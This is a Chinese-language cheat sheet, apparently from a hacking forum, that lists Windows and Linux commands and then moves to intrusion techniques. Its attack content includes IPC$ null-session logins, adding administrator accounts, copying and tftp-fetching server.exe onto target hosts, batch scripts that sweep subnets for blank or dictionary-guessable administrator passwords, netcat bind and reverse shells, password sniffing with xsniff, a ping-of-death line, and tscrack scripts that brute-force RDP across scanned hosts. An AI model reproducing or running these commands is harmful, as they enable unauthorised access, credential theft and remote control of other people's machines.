wmimgmt.msc----打开windows管理体系结构(WMI)\n\n　　41. wupdmgr--------windows更新程序\n\n　　42. wscript--------windows脚本宿主设置\n\n　　43. write----------写字板\n\n　　45. wiaacmgr-------扫描仪和照相机向导\n\n　　46. winchat--------XP自带局域网聊天\n\n　　49. mplayer2-------简易widnows media player\n\n　　50. mspaint--------画图板\n\n　　51. mstsc----------远程桌面连接\n\n　　53. magnify--------放大镜实用程序\n\n　　54. mmc------------打开控制台\n\n　　55. mobsync--------同步命令\n\n　　57. iexpress-------木马捆绑工具，系统自带\n\n　　58. fsmgmt.msc-----共享文件夹管理器\n\n　　59. utilman--------辅助工具管理器\n\n　　61. dcomcnfg-------打开系统组件服务\n\n　　62. ddeshare-------打开DDE共享设置\n\n　　110. osk------------打开屏幕键盘\n\n　　111. odbcad32-------ODBC数据源管理器\n\n　　112. oobe/msoobe /a----检查XP是否激活\n\n　　68. ntbackup-------系统备份和还原\n\n　　69. narrator-------屏幕“讲述人”\n\n　　70. ntmsmgr.msc----移动存储管理器\n\n　　71. ntmsoprq.msc---移动存储管理员操作请求\n\n　　72. netstat -an----(TC)命令检查接口\n\n　　73. syncapp--------创建一个公文包\n\n　　74. sysedit--------系统配置编辑器\n\n　　75. sigverif-------文件签名验证程序\n\n　　76. ciadv.msc------索引服务程序\n\n　　77. shrpubw--------创建共享文件夹\n\n　　78. secpol.msc-----本地安全策略\n\n　　79. syskey---------系统加密，一旦加密就不能解开，保护windows xp系统的双重密码\n\n　　80. services.msc---本地服务设置\n\n　　81. Sndvol32-------音量控制程序\n\n　　82. sfc.exe--------系统文件检查器\n\n　　83. sfc /scannow---windows文件保护\n\n　　84. ciadv.msc------索引服务程序\n\n　　85. tourstart------xp简介（安装完成后出现的漫游xp程序）\n\n　　86. taskmgr--------任务管理器\n\n　　87. eventvwr-------事件查看器\n\n　　88. eudcedit-------造字程序\n\n　　89. compmgmt.msc---计算机管理\n\n　　90. packager-------对象包装程序\n\n　　91. perfmon.msc----计算机性能监测程序\n\n　　92. charmap--------启动字符映射表\n\n　　93. cliconfg-------SQL SERVER 客户端网络实用程序\n\n　　94. Clipbrd--------剪贴板查看器\n\n　　95. conf-----------启动netmeeting\n\n　　96. certmgr.msc----证书管理实用程序\n\n　　97. regsvr32 /u *.dll----停止dll文件运行\n\n　　98. regsvr32 /u zipfldr.dll------取消ZIP支持\n\n　　99. cmd.exe--------CMD命令提示符\n\n操作详解　　\n\nnet use ipipc$ \" \" /user:\" \" 建立IPC空链接\n\n　　net use ipipc$ \"密码\" /user:\"用户名\" 建立IPC非空链接\n\n　　net use h: ipc$ \"密码\" /user:\"用户名\" 直接登陆后映射对方C：到本地为H:\n\n　　net use h: ipc$ 登陆后映射对方C：到本地为H:\n\n　　net use ipipc$ /del 删除IPC链接\n\n　　net use h: /del 删除映射对方到本地的为H:的映射\n\n　　net user 用户名　密码　/add 建立用户\n\n　　net user guest /active:yes 激活guest用户\n\n　　net user 查看有哪些用户\n\n　　net user 帐户名 查看帐户的属性\n\n　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限\n\n　　net start 查看开启了哪些服务\n\n　　net start 服务名　开启服务；(如:net start telnet， net start schedule)\n\n　　net stop 服务名 停止某服务\n\n　　net time 目标ip 查看对方时间\n\n　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息\n\n　　net view 查看本地局域网内开启了哪些共享\n\n　　net view ip 查看对方局域网内开启了哪些共享\n\n　　net config 显示系统网络设置\n\n　　net logoff 断开连接的共享\n\n　　net pause 服务名 暂停某服务\n\n　　net send ip \"文本信息\" 向对方发信息\n\n　　net ver 局域网内正在使用的网络连接类型和信息\n\n　　net share 查看本地开启的共享\n\n　　net share ipc$ 开启ipc$共享\n\n　　net share ipc$ /del 删除ipc$共享\n\n　　net share c$ /del 删除C：共享\n\n　　net user guest 12345 用guest用户登陆后用将密码改为12345\n\n　　net password 密码 更改系统登陆密码\n\n　　netstat -a 查看开启了哪些端口,常用netstat -an\n\n　　netstat -n 查看端口的网络连接情况，常用netstat -an\n\n　　netstat -v 查看正在进行的工作\n\n　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况\n\n　　netstat -s 查看正在使用的所有协议使用情况\n\n　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名\n\n　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。\n\n　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。\n\n　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)\n\n　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息\n\n　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)\n\n　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)\n\n　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示删除当前目录下所有只读文件，“DEL/A-S *.*”表示删除当前目录下除系统文件以外的所有文件\n\n　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）\n\n　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖\n\n　　fc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，\"> \"和\"> >\" 是重定向命令\n\n　　at id号 开启已注册的某个计划任务\n\n　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止\n\n　　at id号 /delete 停止某个已注册的计划任务\n\n　　at 查看所有的计划任务\n\n　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机\n\n　　finger username @host 查看最近有哪些用户登陆\n\n　　telnet ip 端口 远和登陆服务器,默认端口为23\n\n　　open ip 连接到IP（属telnet登陆后的命令）\n\n　　telnet 在本机上直接键入telnet 将进入本机的telnet\n\n　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件\n\n　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下\n\n　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件\n\n　　copy ipadmin$svv.exe c: 或:copyipadmin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：\n\n　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件\n\n　　用参数/e才可连目录下的子目录一起复制到目标地址下。\n\n　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送\n\n　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机\n\n　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)\n\n　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface\n\n　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息\n\n　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令\n\n　　mem 查看cpu使用情况\n\n　　attrib 文件名(目录名) 查看某文件（目录）的属性\n\n　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性\n\n　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间\n\n　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间\n\n　　set 指定环境变量名称=要指派给变量的字符 设置环境变量\n\n　　set 显示当前所有的环境变量\n\n　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量\n\n　　pause 暂停批处理程序，并显示出：请按任意键继续....\n\n　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）\n\n　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）\n\n　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）\n\n　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）\n\n　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置\n\n　　echo 信息 在屏幕上显示出信息\n\n　　echo 信息 >> pass.txt 将\"信息\"保存到pass.txt文件中\n\n　　findstr \"Hello\" aa.txt 在aa.txt文件中寻找字符串hello\n\n　　find 文件名 查找某文件\n\n　　title 标题名字 更改CMD窗口标题名字\n\n　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白\n\n　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )\n\n　　ver 在DOS窗口下显示版本信息\n\n　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）\n\n　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS\n\n　　md　目录名 创建目录\n\n　　replace 源文件　要替换文件的目录 替换文件\n\n　　ren 原文件名　新文件名 重命名文件名\n\n　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称\n\n　　type 文件名 显示文本文件的内容\n\n　　more 文件名 逐屏显示输出文件\n\n　　doskey 要锁定的命令=字符\n\n　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=\n\n　　taskmgr 调出任务管理器\n\n　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误\n\n　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口\n\n　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe\n\n　　path 路径可执行文件的文件名 为可执行文件设置一个路径。\n\n　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?\n\n　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；\n\n　　regedit /e 注册表文件名 导出注册表\n\n　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。\n\n　　cacls 文件名 查看文件的访问用户权限列表\n\n　　REM 文本内容 在批处理文件中添加注解\n\n　　netsh 查看或更改本地网络配置情况\n\n　　IIS服务命令\n\n　　iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）\n\n　　iisreset /start或stop 启动（停止）所有Internet服务\n\n　　iisreset /restart 停止然后重新启动所有Internet服务\n\n　　iisreset /status 显示所有Internet服务状态\n\n　　iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动\n\n　　iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机\n\n　　iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务\n\n　　iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。\n\n　　FTP 命令： (后面有详细说明内容)\n\n　　ftp的命令行格式为:\n\n　　ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。\n\n　　－d 使用调试方式。\n\n　　－n 限制ftp的自动登录,即不使用.netrc文件。\n\n　　－g 取消全局文件名。\n\n　　help [命令] 或 ？[命令] 查看命令说明\n\n　　bye 或 quit 终止主机FTP进程,并退出FTP管理方式.\n\n　　pwd 列出当前远端主机目录\n\n　　put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中\n\n　　get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中\n\n　　mget [remote-files] 从远端主机接收一批文件至本地主机\n\n　　mput local-files 将本地主机中一批文件传送至远端主机\n\n　　dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件\n\n　　ascii 设定以ASCII方式传送文件(缺省值)\n\n　　bin 或 image 设定以二进制方式传送文件\n\n　　bell 每完成一次文件传送,报警提示\n\n　　cdup 返回上一级目录\n\n　　close 中断与远程服务器的ftp会话(与open对应)\n\n　　open host[port] 建立指定ftp服务器连接,可指定连接端口\n\n　　delete 删除远端主机中的文件\n\n　　mdelete [remote-files] 删除一批文件\n\n　　mkdir directory-name 在远端主机中建立目录\n\n　　rename [from] [to] 改变远端主机中的文件名\n\n　　rmdir directory-name 删除远端主机中的目录\n\n　　status 显示当前FTP的状态\n\n　　system 显示远端主机系统类型\n\n　　user user-name [password] [account] 重新以别的用户名登录远端主机\n\n　　open host [port] 重新建立一个新的连接\n\n　　prompt 交互提示模式\n\n　　macdef 定义宏命令\n\n　　lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录\n\n　　chmod 改变远端主机的文件权限\n\n　　case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母\n\n　　cd remote－dir 进入远程主机目录\n\n　　cdup 进入远程主机目录的父目录\n\n　　! 在本地机中执行交互shell，exit回到ftp环境,如!ls*.zip\n\n　　#5\n\n　　MYSQL 命令\n\n　　mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。\n\n　　（例：mysql -h110.110.110.110 -Uroot -P123456\n\n　　注:u与root可以不用加空格，其它也一样）\n\n　　exit 退出MYSQL\n\n　　mysqladmin -u用户名 -p旧密码 password 新密码 修改密码\n\n　　grant select on 数据库.* to 用户名@登录主机 identified by \"密码\"; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）\n\n　　show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。\n\n　　use mysql；\n\n　　show tables; 显示库中的数据表\n\n　　describe 表名; 显示数据表的结构\n\n　　create database 库名; 建库\n\n　　use 库名；\n\n　　create table 表名 (字段设定列表)； 建表\n\n　　drop database 库名;\n\n　　drop table 表名； 删库和删表\n\n　　delete from 表名; 将表中记录清空\n\n　　select * from 表名; 显示表中的记录\n\n　　mysqldump --opt school>school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。\n\n　　win2003系统下新增命令（实用部份）：\n\n　　shutdown /参数 关闭或重启本地或远程主机。\n\n　　参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。\n\n　　例：shutdown /r /t 0 立即重启本地主机（无延时）\n\n　　taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。\n\n　　参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。\n\n　　tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。\n\n　　参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。\n\n　　Linux系统下基本命令　注：要区分大小写\n\n　　uname 显示版本信息（同win2K的 ver）\n\n　　dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）\n\n　　pwd 查询当前所在的目录位置\n\n　　cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。\n\n　　cat 文件名 查看文件内容\n\n　　cat >abc.txt 往abc.txt文件中写上内容。\n\n　　more 文件名 以一页一页的方式显示一个文本文件。\n\n　　cp 复制文件\n\n　　mv 移动文件\n\n　　rm 文件名 删除文件，rm -a 目录名删除目录及子目录\n\n　　mkdir 目录名 建立目录\n\n　　rmdir 删除子目录，目录内没有文档。\n\n　　chmod 设定档案或目录的存取权限\n\n　　grep 在档案中查找字符串\n\n　　diff 档案文件比较\n\n　　find 档案搜寻\n\n　　date 现在的日期、时间\n\n　　who 查询目前和你使用同一台机器的人以及Login时间地点\n\n　　w 查询目前上机者的详细资料\n\n　　whoami 查看自己的帐号名称\n\n　　groups 查看某人的Group\n\n　　passwd 更改密码\n\n　　history 查看自己下过的命令\n\n　　ps 显示进程状态\n\n　　kill 停止某进程\n\n　　gcc 黑客通常用它来编译C语言写的文件\n\n　　su 权限转换为指定使用者\n\n　　telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。\n\n　　ftp ftp连接上某服务器（同win2K）\n\n　　批处理命令与变量\n\n　　1：for命令及变量 基本格式\n\n　　FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。\n\n　　批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3\n\n　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个\"1\"指起始值，第二个\"1\"指增长量，第三个\"254\"指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }\n\n　　command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：& 来隔开\n\n　　command_parameters：为特定命令指定参数或命令行开关\n\n　　IN (set)：指在(set)中取值；DO command ：指执行command\n\n　　参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。\n\n　　用法举例：\n\n　　@echo off\n\n　　echo 用法格式：test.bat *.*.* > test.txt\n\n　　for /L %%G in (1 1 254) do echo %1.%%G >>test.txt & net use \\%1.%%G /user:administrator | find \"命令成功完成\" >>test.txt\n\n　　存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。\n\n　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；& 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有\"命令成功完成\"信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。\n\n　　@echo off\n\n　　echo 用法格式：ok.bat ip\n\n　　FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200\n\n　　存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。\n\n　　七：\n\n　　2：if命令及变量 基本格式\n\n　　IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。\n\n　　例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。\n\n　　0 指发现并成功执行（真）；1 指没有发现、没执行（假）。\n\n　　IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。\n\n　　例：“if \"%2%\"==\"4\" goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加\" \"）\n\n　　IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。\n\n　　例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到\":end\"标签处。\n\n　　IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用< >括起来，因为del命令要单独一行时才能执行，用上< >后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.> else echo test.txt.missing ”，注意命令中的“.”\n\n　　系统外部命令\n\n　　注：系统外部命令(均需下载相关工具)\n\n　　瑞士军刀：nc.exe\n\n　　参数说明：\n\n　　-h 查看帮助信息\n\n　　-d 后台模式\n\n　　-e prog程序重定向，一但连接就执行[危险]\n\n　　-i secs延时的间隔\n\n　　-l 监听模式，用于入站连接\n\n　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C\n\n　　-n IP地址，不能用域名\n\n　　-o film记录16进制的传输\n\n　　-p[空格]端口 本地端口号\n\n　　-r 随机本地及远程端口\n\n　　-t 使用Telnet交互方式\n\n　　-u UDP模式\n\n　　-v 详细输出，用-vv将更详细\n\n　　-w数字 timeout延时间隔\n\n　　-z 将输入，输出关掉（用于扫锚时）\n\n　　基本用法：\n\n　　nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口\n\n　　nc -l -p 80 开启本机的TCP 80端口并监听\n\n　　nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口\n\n　　nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口\n\n　　nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口\n\n　　高级用法：\n\n　　nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止\n\n　　nc -L -p 80 > c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt\n\n　　nc -L -p 80 < c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用\n\n　　type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用\n\n　　本机上用：nc -l -p 本机端口\n\n　　在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K\n\n　　nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙\n\n　　本机上用：nc -d -l -p 本机端口 < 要传送的文件路径及名称\n\n　　在对方主机上用：nc -vv 本机IP 本机端口 > 存放文件的路径及名称 传送文件到对方主机\n\n　　备 注：\n\n　　| 管道命令\n\n　　< 或 > 重定向命令。“<”，例如：tlntadmn < test.txt 指把test.txt的内容赋值给tlntadmn命令\n\n　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt >> d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中\n\n　　>与>>的区别 \">\"指：覆盖；\">>\"指：保存到(添加到）。\n\n　　如：@dir c:winnt >> d:log.txt和@dir c:winnt > d:log.txt二个命令分别执行二次比较看：用>>的则是把二次的结果都保存了，而用：>则只有一次的结果，是因为第二次的结果把第一次的覆盖了。\n\n　　八：\n\n　　扫描工具：xscan.exe\n\n　　基本格式\n\n　　xscan -host <起始IP>[-<终止IP>] <检测项目> [其他选项] 扫锚\"起始IP到终止IP\"段的所有主机信息\n\n　　xscan -file <主机列表文件名> <检测项目> [其他选项] 扫锚\"主机IP列表文件名\"中的所有主机信息\n\n　　检测项目\n\n　　-active 检测主机是否存活\n\n　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）\n\n　　-port 检测常用服务的端口状态\n\n　　-ftp 检测FTP弱口令\n\n　　-pub 检测FTP服务匿名用户写权限\n\n　　-pop3 检测POP3-Server弱口令\n\n　　-smtp 检测SMTP-Server漏洞\n\n　　-sql 检测SQL-Server弱口令\n\n　　-smb 检测NT-Server弱口令\n\n　　-iis 检测IIS编码/解码漏洞\n\n　　-cgi 检测CGI漏洞\n\n　　-nasl 加载Nessus攻击脚本\n\n　　-all 检测以上所有项目\n\n　　其它选项\n\n　　-i 适配器编号 设置网络适配器, <适配器编号>可通过\"-l\"参数获取\n\n　　-l 显示所有网络适配器\n\n　　-v 显示详细扫描进度\n\n　　-p 跳过没有响应的主机\n\n　　-o 跳过没有检测到开放端口的主机\n\n　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10\n\n　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)\n\n　　用法示例\n\n　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机\n\n　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机\n\n　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机\n\n　　九：\n\n　　命令行方式嗅探器: xsniff.exe\n\n　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码\n\n　　参数说明\n\n　　-tcp 输出TCP数据报\n\n　　-udp 输出UDP数据报\n\n　　-icmp 输出ICMP数据报\n\n　　-pass 过滤密码信息\n\n　　-hide 后台运行\n\n　　-host 解析主机名\n\n　　-addr IP地址 过滤IP地址\n\n　　-port 端口 过滤端口\n\n　　-log 文件名 将输出保存到文件\n\n　　-asc 以ASCII形式输出\n\n　　-hex 以16进制形式输出\n\n　　用法示例\n\n　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中\n\n　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出\n\n　　终端服务密码破解: tscrack.exe\n\n　　参数说明\n\n　　-h 显示使用帮助\n\n　　-v 显示版本信息\n\n　　-s 在屏幕上打出解密能力\n\n　　-b 密码错误时发出的声音\n\n　　-t 同是发出多个连接（多线程）\n\n　　-N Prevent System Log entries on targeted server\n\n　　-U 卸载移除tscrack组件\n\n　　-f 使用－f后面的密码\n\n　　-F 间隔时间（频率）\n\n　　-l 使用－l后面的用户名\n\n　　-w 使用－w后面的密码字典\n\n　　-p 使用－p后面的密码\n\n　　-D 登录主页面\n\n　　用法示例\n\n　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码\n\n　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户\n\n　　@if not exist ipcscan.txt goto noscan\n\n　　@for /f \"tokens=1 delims= \" %%i in (3389.txt) do call hack.bat %%i\n\n　　nscan\n\n　　@echo 3389.txt no find or scan faild\n\n　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)\n\n　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat\n\n　　@if not exist tscrack.exe goto noscan\n\n　　@tscrack %1 -l administrator -w pass.dic >>rouji.txt\n\n　　:noscan\n\n　　@echo tscrack.exe no find or scan faild\n\n　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)\n\n　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。\n\n　　其它\n\n　　Shutdown.exe\n\n　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）\n\n　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）\n\n　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息\n\n　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。\n\n　　OpenTelnet.exe (远程开启telnet工具)\n\n　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。\n\n　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。\n\n　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)\n\n　　